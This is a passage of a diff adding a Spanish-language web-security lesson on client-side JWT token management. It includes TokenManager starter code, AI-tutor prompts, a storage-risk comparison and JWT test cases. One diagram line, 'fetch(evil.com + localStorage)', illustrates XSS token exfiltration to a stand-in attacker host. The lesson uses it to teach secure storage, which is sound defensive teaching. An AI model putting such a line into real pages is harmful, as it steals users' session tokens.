+    // Paso 4: atob() → JSON.parse()
+    throw new Error("Implementa _decodePayload en el Reto 3");
+  }
+
+  function _isExpiringSoon() {
+    // TODO: Implementar
+    // Usar _decodePayload(_accessToken) + Math.floor(Date.now()/1000) para comparar con exp
+    // ⚠️ Date.now() devuelve milisegundos — divide entre 1000 antes de comparar con exp
+    throw new Error("Implementa _isExpiringSoon en el Reto 3");
+  }
+
+  /**
+   * Recibe el access_token del servidor después de login o refresh.
+   * El refresh_token llega en cookie HttpOnly — el servidor lo configura,
+   * el navegador lo guarda, JavaScript no lo ve. No hay segundo parámetro.
+   */
+  function storeTokens(accessToken) {
+    // TODO: Almacenar accessToken en _accessToken
+    throw new Error("Implementa storeTokens en el Reto 3");
+  }
+
+  function getAuthHeader() {
+    // TODO: Retornar {"Authorization": "Bearer " + _accessToken}
+    throw new Error("Implementa getAuthHeader en el Reto 3");
+  }
+
+  /**
+   * Refresh singleton con cola de espera.
+   * Si ya hay un refresh en curso, las llamadas adicionales se encolan
+   * como Promises que resolverán cuando el refresh activo termine.
+   *
+   * 💡 Andamiaje — la cola ya está estructurada:
+   *   Encolar:  new Promise(resolve => _refreshQueue.push(resolve))
+   *   Liberar:  _refreshQueue.forEach(resolve => resolve(nuevoToken))
+   * Tu tarea: implementar la lógica que conecta estos dos momentos.
+   */
+  async function refreshAccessToken() {
+    if (_isRefreshing) {
+      // Ya hay un refresh en curso — encolar y esperar su resultado
+      return new Promise(resolve => _refreshQueue.push(resolve));
+      // Cuando el refresh activo termine, llamará a resolve(nuevoToken)
+      // y esta Promise retornará el nuevo access_token sin hacer otra petición.
+    }
+    _isRefreshing = true;
+    try {
+      // Sub-ruta B: el refresh_token viaja en cookie HttpOnly automáticamente.
+      // credentials:'include' hace que el navegador adjunte la cookie al request.
+      // TODO: hacer POST a REFRESH_ENDPOINT con { credentials: 'include' }
+      // Si exitoso: actualizar _accessToken con el nuevo token del response
+      //             luego liberar la cola: _refreshQueue.forEach(r => r(_accessToken))
+      // Si falla 401: llamar a logout(), luego rechazar la cola
+      throw new Error("Implementa el bloque try de refreshAccessToken en Reto 3");
+    } finally {
+      _isRefreshing = false;
+      _refreshQueue = [];
+    }
+  }
+
+  function logout() {
+    // TODO: Limpiar _accessToken = null
+    // El refresh_token (cookie HttpOnly) se borra llamando a POST /api/auth/logout
+    // con credentials:'include' — el servidor setea la cookie con Max-Age=0.
+    // JavaScript no puede borrar una cookie HttpOnly directamente.
+    throw new Error("Implementa logout en Reto 3");
+  }
+
+  // API pública del módulo
+  return { storeTokens, getAuthHeader, refreshAccessToken, logout, _isExpiringSoon };
+})();</code></pre>
+            </div>
+
+            <!-- RETO 3 -->
+            <div class="reto-ia">
+                <div class="reto-ia-header">
+                    <span class="reto-numero">3</span>
+                    <h4>Implementa el TokenManager — método por método <span class="reto-badge esencial">Esencial</span></h4>
+                </div>
+                <div class="reto-ia-body">
+                    <div class="rol-ia"><strong>🤖 Rol de la IA:</strong> Arquitecto de clientes distribuidos especialista en gestión de tokens — que guía implementación sin hacer todo por ti.</div>
+
+                    <div class="context-box warning" style="margin-bottom: 1rem;">
+                        <div class="box-title">⚙️ Orden de implementación recomendado — de menor a mayor complejidad</div>
+                        <p>Implementa en este orden. Si te bloqueas en un método, avanza al siguiente y regresa — los primeros cuatro son independientes del singleton:</p>
+                        <ol style="margin: 0.5rem 0 0 1.5rem;">
+                            <li><code>decode_payload</code> / <code>_decodePayload</code> — parsing de cadena</li>
+                            <li><code>is_expiring_soon</code> / <code>_isExpiringSoon</code> — aritmética de tiempo</li>
+                            <li><code>store_tokens</code> / <code>storeTokens</code> — asignación de variable</li>
+                            <li><code>get_auth_header</code> / <code>getAuthHeader</code> — formateo de string</li>
+                            <li><code>logout</code> — limpieza de estado</li>
+                            <li><code>refresh_access_token</code> / <code>refreshAccessToken</code> ← <strong>más complejo</strong>, requiere concurrencia</li>
+                        </ol>
+                        <p style="margin-top: 0.8rem;"><strong>Entrega alternativa válida:</strong> Si después de 30 min no logras implementar el patrón singleton completo, es preferible entregar los métodos 1–5 con comprensión total, más un comentario técnico detallado que explique <em>qué debería hacer</em> el refresh singleton y <em>por qué</em>, que entregar un refresh singleton generado íntegramente por la IA que no puedas explicar. La evaluación de REFLEXIONA y VALIDA no depende del singleton.</p>
+                    </div>
+                    <div class="prompt-box">Actúa como arquitecto especialista en gestión de tokens desde el cliente. Tengo el starter code del TokenManager para EcoMarket (proporcionado en el documento de la semana). Necesito implementar cada método uno por uno.
+
+Regla importante: guíame con preguntas y pistas, no me des la implementación completa de golpe. Si sientes que estás volcando demasiado código de una vez, para y pregúntame qué parte entendí primero.
+
+Método 1: decode_payload / _decodePayload
+Mi intento actual es: [escribe aquí tu intento antes de continuar]
+→ Corrígeme si hay errores. Presta atención especial a: manejo del padding de Base64URL (¿cuándo hay que añadir '=' al final?), manejo de token malformado (IndexError/split vacío), y diferencia entre Base64 estándar y Base64URL.
+
+Método 2: is_expiring_soon / _isExpiringSoon
+Después de que yo intente implementarlo, ayúdame a detectar si estoy usando las unidades correctas (segundos vs milisegundos en el campo exp).
+
+Método 3: refresh_access_token / refreshAccessToken — el patrón singleton
+Esta es la parte más compleja. Antes de mostrarme código, explícame:
+- ¿Qué pasa exactamente si dos peticiones concurrentes llegan al método refresh al mismo tiempo y no hay lock/flag?
+- ¿Qué significa que las peticiones en espera "resuelvan con el mismo resultado del refresh"?
+Luego déjame proponer la estructura del lock. Corrígeme antes de continuar.
+
+NOTA para Ruta Browser (JS): el starter code ya te da las dos líneas clave del patrón de cola:
+  Encolar: new Promise(resolve => _refreshQueue.push(resolve))
+  Liberar: _refreshQueue.forEach(resolve => resolve(nuevoToken))
+Tu tarea es conectar esos dos momentos: ¿en qué punto del try-block llamas al forEach?
+¿Qué pasa con la cola si el refresh falla — resuelves o rechazas? ¿Por qué?
+
+Método 4: logout
+¿Qué estado exactamente debo limpiar? ¿Hay algún efecto secundario que un estudiante frecuentemente olvida limpiar (ej: timers, estado de _isRefreshing)?
+
+Nota para lenguajes distintos a Python/JS: si uso Java, Kotlin, Swift u otro, pide a la IA que adapte los tipos y mecanismos de concurrencia — los conceptos (lock, cola de espera, cleanup) son idénticos.</div>
+                    <div class="entregable-box">
+                        Clase <code>TokenManager</code> completa con todos los métodos del starter code implementados. Incluye: (1) un script de prueba manual que hace login simulado, almacena tokens, decodifica el payload e imprime el tiempo restante hasta expiración; (2) un comentario por método explicando la decisión de diseño más importante que tomaste (no solo qué hace, sino por qué lo hace así).
+                    </div>
+                </div>
+            </div>
+
+            <!-- RETO 4 -->
+            <div class="reto-ia">
+                <div class="reto-ia-header">
+                    <span class="reto-numero">4</span>
+                    <h4>Interceptor HTTP: adjuntar token y manejar 401 silenciosamente <span class="reto-badge esencial">Esencial</span></h4>
+                </div>
+                <div class="reto-ia-body">
+                    <div class="rol-ia"><strong>🤖 Rol de la IA:</strong> Arquitecto de clientes distribuidos que explica el patrón Decorator aplicado a peticiones HTTP.</div>
+                    <div class="prompt-box">Actúa como arquitecto especialista en patrones de cliente HTTP.
+
+Tengo mi TokenManager implementado. Ahora necesito que TODAS las peticiones a la API de EcoMarket adjunten automáticamente el token, sin que cada parte del código deba recordar hacerlo manualmente. Esto se llama "interceptor HTTP".
+
+Guíame en este orden, esperando mi respuesta antes de continuar:
+
+1. DISEÑO PRIMERO: ¿Qué patrón de diseño describe este interceptor? ¿Por qué no es un Middleware (que es del lado del servidor) sino un Decorator o Proxy (del lado del cliente)?
+   → Dame la analogía más clara para un estudiante de segundo semestre.
+
+2. IMPLEMENTACIÓN BÁSICA (tu ruta):
+   → Ruta Python: ¿Cómo uso requests.Session con hooks['response'] para interceptar respuestas 401 automáticamente y reintentar con token renovado? Muéstrame solo el esqueleto del hook, yo completo el cuerpo.
+   → Ruta Browser JS: ¿Cómo creo una función authFetch(url, options) que envuelva fetch() nativo, adjunte el header y maneje 401? Muéstrame solo la firma de la función y la estructura del try/catch, yo completo el resto.
+
+3. EL CASO DIFÍCIL — Loop infinito de refresh:
+   ¿Qué pasa si el endpoint /api/auth/refresh mismo devuelve 401? Si mi interceptor está configurado para reintentar en cualquier 401, intentará hacer refresh del refresh... indefinidamente. ¿Cómo detecto en el interceptor que la petición fallida ES la de refresh y no debo reintentar?
+
+4. INTEGRACIÓN CON TokenManager:
+   Dibuja en texto/pseudocódigo la secuencia de llamadas: authFetch → detecta 401 → TokenManager.refresh() → reintento. ¿En qué momento exacto se adjunta el nuevo token?
+
+Recuérdame si estoy olvidando algún caso edge que un interceptor de producción debe manejar.</div>
+                    <div class="entregable-box">
+                        Función <code>auth_request()</code> (Python) o <code>authFetch()</code> (JS) que: adjunta automáticamente <code>Authorization: Bearer</code>, detecta 401, llama a <code>TokenManager.refresh()</code> y reintenta la petición original una vez. Demuestra su funcionamiento con una petición a <code>/api/ecomarket/precios</code> (puedes usar mock). Incluye el manejo del caso "la petición de refresh también devuelve 401 → logout".
+                    </div>
+                </div>
+            </div>
+
+            <div class="entregable-unico-box">
+                <h4>📦 Entregable Integrado de la Fase APLICA</h4>
+                <p style="opacity: 0.85; margin-bottom: 1rem;"><strong>Nivel mínimo (Retos 3 + 4 Esenciales):</strong></p>
+                <ul>
+                    <li>Clase <code>TokenManager</code> con <code>decode_payload</code>, <code>is_expiring_soon</code>, <code>store_tokens</code>, <code>get_auth_header</code> y <code>logout</code> implementados y comentados.</li>
+                    <li>Función interceptora (<code>auth_request</code> o <code>authFetch</code>) que adjunta <code>Authorization: Bearer</code> y maneja un 401 con reintento único.</li>
+                    <li>Script de demostración ejecutable: login simulado → petición autenticada → 401 simulado → refresh → reintento exitoso → logout.</li>
+                    <li>Bitácora: 3–5 decisiones de diseño con justificación propia (no generadas por la IA).</li>
+                </ul>
+                <p style="opacity: 0.85; margin: 1rem 0 0.5rem;"><strong>Nivel extendido (suma puntos en evaluación):</strong></p>
+                <ul>
+                    <li>Refresh singleton verificado con contador de peticiones reales (Caso 6 de VALIDA).</li>
+                    <li>Refresh proactivo implementado — timer que llama a <code>refresh_access_token()</code> cuando <code>is_expiring_soon()</code> detecta la ventana de 5 min.</li>
+                </ul>
+            </div>
+
+            <div class="invariantes-box">
+                <h4>🔒 Invariantes que no deben romperse — APLICA</h4>
+                <ul>
+                    <li>El interceptor debe reintentar la petición original <strong>exactamente una vez</strong> después del refresh. Si el reintento también falla con 401, debe ejecutar logout — no reintentar indefinidamente.</li>
+                    <li>El lock/flag de refresh singleton debe liberarse <strong>siempre</strong>, incluso si el refresh falla con una excepción — de lo contrario el cliente queda bloqueado permanentemente.</li>
+                    <li>El método <code>logout()</code> debe limpiar <strong>todo</strong> el estado: tokens, timer de refresh proactivo, cola de espera, flag de refreshing. Un logout parcial deja tokens fantasma en memoria.</li>
+                    <li>La función <code>decode_payload()</code> debe validar que el token tiene <strong>exactamente tres partes</strong> separadas por <code>.</code> antes de intentar decodificar. Un token malformado no debe levantar una excepción sin capturar que derribe el cliente.</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <!-- ========== FASE 3: REFLEXIONA ========== -->
+    <section id="reflexiona" class="fase-section">
+        <div class="fase-header reflexiona">
+            <div class="fase-icon">🔍</div>
+            <div class="fase-info">
+                <h2>REFLEXIONA — Trade-offs y Decisiones de Seguridad</h2>
+                <div class="bloom-tag">🎓 Bloom: Analizar · Comparar trade-offs · Justificar decisiones</div>
+            </div>
+        </div>
+        <div class="fase-content">
+
+            <div class="objetivos-box">
+                <h4>🎯 Objetivos de esta fase</h4>
+                <ul>
+                    <li><strong>Ruta Browser:</strong> Analizar las opciones de almacenamiento de tokens (memoria, sessionStorage, localStorage, cookie HttpOnly) y sus implicaciones de seguridad ante XSS y CSRF.</li>
+                    <li><strong>Ruta Python:</strong> Analizar las opciones de almacenamiento en entornos de proceso/servicio (memoria de proceso, archivo cifrado, keychain del OS, variables de entorno) y sus implicaciones ante compromiso de proceso o sistema de archivos.</li>
+                    <li>Reflexionar sobre la ventana de expiración óptima para el refresh proactivo — balance entre seguridad y carga al servidor (aplica a ambas rutas).</li>
+                    <li>Identificar el problema de sincronización de reloj entre cliente y servidor y cómo afecta al cálculo de expiración (aplica a ambas rutas).</li>
+                    <li>Justificar las decisiones de diseño tomadas en APLICA con argumentos de seguridad concretos y específicos a tu plataforma.</li>
+                </ul>
+            </div>
+
+            <div class="contenido-section">
+                <h3>¿Dónde guardar los tokens? — El problema más subestimado del cliente</h3>
+                <p>La decisión de almacenamiento del JWT es una de las más debatidas en seguridad web. No hay una respuesta universalmente correcta — cada opción tiene trade-offs. El objetivo es que puedas justificar tu elección, no que memorices una regla.</p>
+            </div>
+
+            <table class="tabla-comparativa">
+                <thead>
+                    <tr>
+                        <th>Opción</th>
+                        <th>Persistencia</th>
+                        <th>Accesible por JS</th>
+                        <th>Vulnerabilidad principal</th>
+                        <th>Cuándo usarlo</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Memoria (variable JS / Python)</strong></td>
+                        <td>Solo mientras el proceso vive</td>
+                        <td>✅ Sí (módulo)</td>
+                        <td>Se pierde al cerrar/recargar</td>
+                        <td>Access token en browser — ventana de daño limitada a 15 min</td>
+                    </tr>
+                    <tr>
+                        <td><strong>sessionStorage (browser)</strong></td>
+                        <td>Solo pestaña actual</td>
+                        <td>✅ Sí</td>
+                        <td>XSS puede leerlo</td>
+                        <td>Aceptable para access_token si XSS está mitigado con CSP</td>
+                    </tr>
+                    <tr>
+                        <td><strong>localStorage (browser)</strong></td>
+                        <td>Indefinida</td>
+                        <td>✅ Sí</td>
+                        <td>XSS persistente — cualquier script puede leerlo</td>
+                        <td>Evitar para tokens — especialmente refresh_token</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Cookie HttpOnly (browser)</strong></td>
+                        <td>Configurable</td>
+                        <td>❌ No (HttpOnly)</td>
+                        <td>CSRF (se envía automáticamente al origen)</td>
+                        <td>Ideal para refresh_token si se implementa CSRF protection</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Archivo cifrado / Keychain (Python / móvil)</strong></td>
+                        <td>Persistente</td>
+                        <td>Solo el proceso</td>
+                        <td>Compromiso del sistema de archivos</td>
+                        <td>Aplicaciones nativas que necesitan persistir refresh_token</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="ascii-diagram" role="img" aria-label="Diagrama comparativo: vulnerabilidades de ataque según el método de almacenamiento de tokens. localStorage es susceptible a XSS con una línea de código. Memoria JS reduce la ventana de daño a 15 minutos. Cookie HttpOnly bloquea XSS pero es vulnerable a CSRF. La descripción textual aparece en el párrafo siguiente.">
+
+                    ┌─────────────┬──────────────────────────────┐
+                    │ localStorage│ XSS: fetch(evil.com + localStorage)   │
+                    │             │ Un script inyectado lee TODOS los tokens en < 1 línea │
+                    └─────────────┴──────────────────────────────┘
+
+                    ┌─────────────┬──────────────────────────────┐
+                    │ Memoria JS  │ XSS: más difícil — requiere acceso al closure del módulo │
+                    │             │ Si el token vive 15 min, la ventana de daño es corta    │
+                    └─────────────┴──────────────────────────────┘
+
+                    ┌─────────────┬──────────────────────────────┐
+                    │ HttpOnly    │ XSS: NO puede leer la cookie  │
+                    │ Cookie      │ CSRF: el navegador la envía automáticamente            │
+                    │             │ → Proteger con SameSite=Strict o CSRF token en header  │
+                    └─────────────┴──────────────────────────────┘
+
+ESTRATEGIA RECOMENDADA para panel EcoMarket:
+  access_token  → memoria JS (módulo) ← se pierde al recargar, ok — refresh lo renueva
+  refresh_token → cookie HttpOnly + SameSite=Strict ← JavaScript no puede leerla
+            </div>
+            <div class="diagrama-descripcion">
+                <strong>Qué representa:</strong> una comparación directa de vulnerabilidades según el método de almacenamiento. <strong>Simplifica:</strong> omite detalles de implementación de mitigaciones (CSP, SameSite, CSRF tokens) para enfocarse en el vector de ataque principal de cada opción. <strong>Aspecto clave:</strong> no existe almacenamiento "seguro por defecto" — cada opción intercambia una vulnerabilidad por otra.
+            </div>
+
+            <!-- RETO 5 -->
+            <div class="reto-ia">
+                <div class="reto-ia-header">
+                    <span class="reto-numero">5</span>
+                    <h4>Justifica tus decisiones de diseño ante el equipo de seguridad <span class="reto-badge esencial">Esencial</span></h4>
+                </div>
+                <div class="reto-ia-body">
+                    <div class="rol-ia"><strong>🤖 Rol de la IA:</strong> Auditor de seguridad del equipo de EcoMarket que hace preguntas difíciles sobre las decisiones de implementación del cliente — ajustadas a tu plataforma.</div>
+
+                    <div class="context-box warning" style="margin-bottom: 1rem;">
+                        <div class="box-title">🔀 Usa el prompt de tu ruta — el modelo de amenaza es diferente</div>
+                        <p>Las vulnerabilidades que aplican a un cliente browser (XSS, CSRF, cookies) son distintas a las de una aplicación Python de terminal o servicio (acceso al proceso, variables de entorno, archivos). Usar el prompt equivocado produce reflexiones irrelevantes para tu arquitectura.</p>
+                    </div>
+
+                    <div class="ruta-tabs">
+                        <button class="ruta-tab python active" data-tab-grupo="reto5" data-tab-id="ruta-reto5-python" onclick="showRuta('reto5','ruta-reto5-python')">🐍 Ruta Python</button>
+                        <button class="ruta-tab browser" data-tab-grupo="reto5" data-tab-id="ruta-reto5-browser" onclick="showRuta('reto5','ruta-reto5-browser')">🌐 Ruta Browser (JS)</button>
+                    </div>
+
+                    <div id="ruta-reto5-python" class="ruta-content active" data-ruta-grupo="reto5">
+                        <div class="prompt-box">Actúa como auditor de seguridad del equipo de EcoMarket. Mi cliente es una aplicación Python (script de terminal o servicio). Voy a presentarte mis decisiones y tú me harás preguntas de auditoría — una por una, esperando mi respuesta antes de continuar.
+
+Mis decisiones:
+1. Almacenamiento: [describe dónde guardas access_token y refresh_token — ¿variables en memoria del proceso, archivo cifrado, variable de entorno?]
+2. Margin de refresh proactivo: [cuántos segundos antes de exp disparas el refresh]
+3. Manejo de refresh singleton: [describe tu mecanismo — asyncio.Lock, threading.Lock, flag simple]
+4. Comportamiento ante refresh fallido: [qué hace tu cliente cuando el refresh_token también devuelve 401]
+
+Por cada decisión, hazme estas preguntas de auditoría del CONTEXTO PYTHON:
+A) "¿Qué pasa si otro proceso en el mismo equipo hace kill -9 a tu proceso mientras tienes el access_token en memoria? ¿Dónde está el refresh_token en ese momento?"
+B) "Si guardas el refresh_token en un archivo en disco, ¿qué permisos debe tener ese archivo y por qué?"
+C) "¿Tu asyncio.Lock protege el refresh si hay múltiples workers o procesos (no solo co-rutinas)? ¿Qué mecanismo necesitarías para escenarios multi-proceso?"
+D) "¿Por qué elegiste este margin de refresh de [X] segundos y no 60 segundos o 10 minutos?"
+
+Sé crítico pero constructivo. Si mi justificación es vaga ("es más seguro"), pídeme un escenario concreto.
+
+Si detecto que la IA acepta mis justificaciones sin cuestionarlas, usaré la frase: "¿Qué caso edge no estoy considerando?" para forzar una revisión más profunda.</div>
+                    </div>
+
+                    <div id="ruta-reto5-browser" class="ruta-content" data-ruta-grupo="reto5">
+                        <div class="prompt-box">Actúa como auditor de seguridad del equipo de EcoMarket. Mi cliente es una aplicación browser (JavaScript). Voy a presentarte mis decisiones y tú me harás preguntas de auditoría — una por una, esperando mi respuesta antes de continuar.
+
+Mis decisiones:
+1. Almacenamiento del access_token: [memoria JS de módulo / sessionStorage — justifica]
+2. Estrategia del refresh_token: [Sub-ruta A: memoria JS con envío en body / Sub-ruta B: cookie HttpOnly con credentials:'include']
+3. Margin de refresh proactivo: [cuántos segundos antes de exp disparas el refresh]
+4. Manejo de refresh singleton: [describe tu mecanismo — _isRefreshing flag + _refreshQueue]
+5. Comportamiento ante refresh fallido: [qué hace tu cliente cuando el refresh devuelve 401]
+
+Por cada decisión, hazme estas preguntas de auditoría del CONTEXTO BROWSER:
+A) "¿Qué escenario de ataque XSS específico mitiga esta decisión de almacenamiento?"
+B) "Si usas Sub-ruta B (cookie HttpOnly), ¿por qué el cliente necesita enviar credentials:'include' explícitamente? ¿Qué pasa si lo omites?"
+C) "¿Tu _refreshQueue resuelve o rechaza las Promises en espera cuando el refresh falla? ¿Cuál es la consecuencia para la UI si rechazas vs. si simplemente las dejas pendientes?"
+D) "¿Por qué elegiste este margin de refresh de [X] segundos y no 60 segundos o 10 minutos?"
+
+Sé crítico pero constructivo. Si mi justificación es vaga ("es más seguro"), pídeme un escenario concreto.
+
+Si detecto que la IA acepta mis justificaciones sin cuestionarlas, usaré la frase: "¿Qué caso edge no estoy considerando?" para forzar una revisión más profunda.</div>
+                    </div>
+
+                    <div class="entregable-box">
+                        Documento de decisiones de diseño (puede ser comentario de código extenso o texto separado): para cada decisión auditada, una justificación concreta que responda a las preguntas del auditor. Mínimo 2–3 oraciones por decisión, con referencia a al menos un escenario de ataque o fallo específico de tu plataforma.
+                    </div>
+                </div>
+            </div>
+
+            <div class="context-box warning">
+                <div class="box-title">⏰ El problema del reloj desincronizado (clock skew)</div>
+                <p>Tu cliente calcula <code>exp - time.time()</code> para saber cuánto tiempo falta. Pero el reloj de tu máquina puede estar adelantado o atrasado respecto al servidor. Si tu cliente tiene el reloj 2 minutos adelantado, pensará que el token expiró 2 minutos antes de que el servidor lo invalide — causando refreshes innecesarios. Si está 2 minutos atrasado, intentará usar un token ya rechazado por el servidor. <strong>La solución práctica:</strong> usar un margen de expiración generoso (5 min) y siempre manejar el caso de 401 reactivo como la fuente de verdad definitiva.</p>
+            </div>
+
+            <div class="checkpoint">
+                <h4>🧠 Checkpoint Metacognitivo — REFLEXIONA</h4>
+                <div class="pregunta"><strong>Ambas rutas:</strong> ¿Puedes explicar por qué el refresh_token necesita más protección que el access_token, usando solo los números de duración (15 min vs 7 días) como argumento central?</div>
+                <div class="pregunta"><strong>Ruta Browser:</strong> ¿Puedes explicar la diferencia entre XSS y CSRF sin copiar definiciones? ¿Por qué localStorage es vulnerable a XSS pero no a CSRF, y las cookies HttpOnly son lo contrario? — Si usas Sub-ruta B, ¿por qué el ataque CSRF al endpoint <code>/api/auth/refresh</code> no le sirve al atacante si el response body solo contiene el nuevo access_token?</div>
+                <div class="pregunta"><strong>Ruta Python:</strong> ¿Tu TokenManager funcionaría si el proceso se ejecuta con múltiples workers (ej. gunicorn con 4 workers)? ¿El <code>asyncio.Lock</code> protege el refresh entre workers distintos o solo entre co-rutinas del mismo proceso? ¿Qué necesitarías para hacerlo realmente distribuido?</div>
+                <div class="pregunta"><strong>Ambas rutas:</strong> ¿Podrías detectar si la IA está recomendando una estrategia de almacenamiento "fácil" sin considerar el modelo de amenaza de tu plataforma? ¿Qué argumento concreto usarías para rechazarla?</div>
+            </div>
+
+            <div class="invariantes-box">
+                <h4>🔒 Invariantes que no deben romperse — REFLEXIONA</h4>
+                <ul>
+                    <li>El refresh_token tiene <strong>más valor que el access_token</strong> (vive 7 días vs 15 min). Debe almacenarse con la mayor protección disponible en tu plataforma. Si ambos están en localStorage, el beneficio de la duración corta del access_token desaparece.</li>
+                    <li>Un margen de refresh proactivo de <strong>0 segundos</strong> equivale a no tener refresh proactivo — solo el reactivo funcionará. Un margen de <strong>más de la mitad de la vida del token</strong> (ej: 10 min para un token de 15 min) generará refreshes tan frecuentes que saturan el servidor.</li>
+                    <li>La decisión de almacenamiento <strong>depende de la plataforma</strong>: lo óptimo en browser (memoria + cookie HttpOnly) es diferente de lo óptimo en una app Python de escritorio (keychain del OS) o en un servicio backend-to-backend (variables de entorno o vault).</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <!-- ========== FASE 4: VALIDA ========== -->
+    <section id="valida" class="fase-section">
+        <div class="fase-header valida">
+            <div class="fase-icon">✔</div>
+            <div class="fase-info">
+                <h2>VALIDA — Prueba tu TokenManager contra casos adversos</h2>
+                <div class="bloom-tag">🎓 Bloom: Evaluar · Detectar errores · Auditar casos edge</div>
+            </div>
+        </div>
+        <div class="fase-content">
+
+            <div class="objetivos-box">
+                <h4>🎯 Objetivos de esta fase</h4>
+                <ul>
+                    <li>Verificar que el TokenManager maneja correctamente tokens malformados, expirados y con claims faltantes — sin lanzar excepciones no capturadas.</li>
+                    <li>Simular el escenario de refresh simultáneo para verificar que el singleton funciona correctamente.</li>
+                    <li>Auditar el comportamiento del cliente ante un servidor que devuelve 401 en el endpoint de refresh.</li>
+                    <li>Detectar condiciones que la IA podría haber implementado incorrectamente en el Reto 3.</li>
+                </ul>
+            </div>
+
+            <div class="contenido-section">
+                <h3>Casos de prueba para el TokenManager</h3>
+                <p>Usa el siguiente conjunto de tokens de prueba para validar tu implementación. Cada uno está diseñado para ejercitar una ruta específica del código.</p>
+            </div>
+
+            <div class="ascii-diagram" role="img" aria-label="Tabla de casos de prueba para el TokenManager: 6 casos con tokens JWT concretos en Base64URL que cubren token válido, token expirado, token malformado con 2 partes, payload no-JSON, token sin campo exp, y prueba de refresh simultáneo. La descripción textual aparece en el párrafo siguiente.">
+
+── Caso 1: Token bien formado, no expirado ─────────────────────────────
+  Header:  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+  Payload: eyJzdWIiOiJ1c2VyXzEiLCJleHAiOjk5OTk5OTk5OTksImlhdCI6MTcxNDAwMH0
+  Sig:     cualquiercosa
+  Token:   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEiLCJleHAiOjk5OTk5OTk5OTksImlhdCI6MTcxNDAwMH0.cualquiercosa
+  Payload decodificado: {"sub":"user_1","exp":9999999999,"iat":1714000}
+  → Resultado esperado: is_expiring_soon() = False
+
+── Caso 2: Token expirado hace 10 minutos ──────────────────────────────
+  Payload (base64url): eyJzdWIiOiJ1c2VyXzIiLCJleHAiOjE3MDAwMDAwMDAsImlhdCI6MTcwMDAwMDAwMH0
+  Payload decodificado: {"sub":"user_2","exp":1700000000,"iat":1700000000}
+  → Resultado esperado: is_expiring_soon() = True (ya expiró)
+
+── Caso 3: Token malformado — solo 2 partes ───────────────────────────
+  Token:   eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyXzMifQ
+  → Resultado esperado: decode_payload() lanza ValueError controlado, NO IndexError sin capturar
+
+── Caso 4: Token con payload inválido (no es JSON válido) ─────────────
+  Token:   eyJhbGciOiJIUzI1NiJ9.bm9fanNvbg.firma
+  Payload base64url = "no_json" (texto plano que no es JSON)
+  → Resultado esperado: decode_payload() lanza ValueError o JSONDecodeError controlado
+
+── Caso 5: Token sin campo exp ────────────────────────────────────────
+  Payload decodificado: {"sub":"user_5","iat":1714000000}
+  → Resultado esperado: is_expiring_soon() retorna True (tratar como expirado si no hay exp)
+  ¿Tu implementación maneja el KeyError/undefined de acceder a exp inexistente?
+
+── Caso 6: Refresh simultáneo — prueba del singleton ──────────────────
+  Simula 5 co-rutinas/promesas concurrentes que llaman a refresh() al mismo tiempo.
+  → Resultado esperado: SOLO UNA petición real al servidor de refresh.
+  → Las otras 4 reciben el resultado de la primera.
+  ¿Cómo verificas esto? Añade un contador de llamadas reales al endpoint de refresh.
+            </div>
+            <div class="diagrama-descripcion">
+                <strong>Qué representa:</strong> un conjunto completo de casos de prueba adversos para el TokenManager, diseñados para detectar los errores más comunes de implementación. <strong>Simplifica:</strong> usa payloads Base64URL concretos que puedes copiar directamente en tu código de prueba. <strong>Aspecto clave:</strong> los Casos 3, 4 y 5 detectan manejo incorrecto de errores que la IA frecuentemente omite; el Caso 6 verifica el invariante más difícil de implementar.
+            </div>
+
+            <!-- RETO 6 -->
+            <div class="reto-ia">
+                <div class="reto-ia-header">
+                    <span class="reto-numero">6</span>
+                    <h4>Auditoría de seguridad del TokenManager — encuentra lo que la IA pasó por alto <span class="reto-badge esencial">Esencial</span></h4>
+                </div>
+                <div class="reto-ia-body">
+                    <div class="rol-ia"><strong>🤖 Rol de la IA:</strong> Asistente técnico que ejecuta los casos de prueba — pero el estudiante decide qué probar y evalúa si los resultados son correctos.</div>
+
+                    <div class="context-box info" style="margin-bottom: 1rem;">
+                        <div class="box-title">🔀 Alcance por ruta</div>
+                        <p><strong>Ambas rutas:</strong> Casos 1–5 (decode_payload, expiración, malformados) y Caso 6 (singleton) — aplican íntegramente.</p>
+                        <p style="margin-top: 0.5rem;"><strong>Ruta Browser:</strong> La pregunta adicional del final ("¿qué pasa si el 200 no incluye access_token?") incluye también: ¿tu código intenta leer <code>_refreshToken</code> en algún punto? Si sí, es un bug — en Sub-ruta B esa variable no existe.</p>
+                        <p style="margin-top: 0.5rem;"><strong>Ruta Python:</strong> Sustituye la pregunta adicional por: "¿Qué pasa si <code>aiohttp.ClientError</code> se lanza durante el refresh mientras hay 3 co-rutinas encoladas — el finally libera el lock correctamente pero ¿las co-rutinas encoladas reciben la excepción o quedan colgadas?"</p>
+                    </div>
+
+                    <div class="prompt-box">Actúa como asistente técnico. Voy a darte mi implementación del TokenManager y los 6 casos de prueba del documento de la semana. Tu rol es:
+1. Ejecutar mentalmente cada caso de prueba y decirme qué retorna mi código.
+2. NO decirme de inmediato si hay un error — primero dame el resultado, y yo decidiré si es correcto.
+3. Si encuentro un error, guíame con preguntas hacia la corrección, sin darme el código completo.
+
+[Pega aquí tu implementación completa del TokenManager]
+
+Ahora ejecuta el Caso 1 primero. Dime el resultado paso a paso (cómo decodifica el payload, qué valor tiene exp, qué retorna is_expiring_soon).
+→ Yo verificaré si el resultado es correcto antes de continuar al Caso 2.
+
+Para el Caso 6 (singleton), necesito verificar que SOLO se hace una petición real. ¿Cómo puedo instrumentar mi código para contar las llamadas reales al endpoint de refresh sin modificar la lógica del TokenManager? Proponme un enfoque y yo lo implemento.
+
+Si encuentro que mi implementación pasa todos los casos, usa la pregunta adicional correspondiente a mi ruta (indicada en el recuadro azul de arriba) para encontrar el caso edge que probablemente no consideré.</div>
+                    <div class="entregable-box">
